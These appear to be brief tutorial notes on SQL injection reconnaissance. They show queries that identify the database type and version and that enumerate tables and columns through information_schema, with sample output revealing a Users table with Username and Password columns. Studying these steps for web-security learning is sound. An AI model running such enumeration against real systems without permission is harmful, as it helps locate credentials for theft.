Determine the type and the version of the database software, which is necessary for the SQLi attack. Base on that information you can determine the payload for this database type.
ex: 
 Database type 	     Query
Microsoft, MySQL 	SELECT @@version
Oracle 	            SELECT * FROM v$version
PostgreSQL 	        SELECT version()




You can query information_schema.tables to list the tables in the database:
SELECT * FROM information_schema.tables



This returns output like the following:
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE


 This output indicates that there are three tables, called Products, Users, and Feedback.

You can then query information_schema.columns to list the columns in individual tables:
SELECT * FROM information_schema.columns WHERE table_name = 'Users'

This returns output like the following:
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar

This output shows the columns in the specified table and the data type of each column. 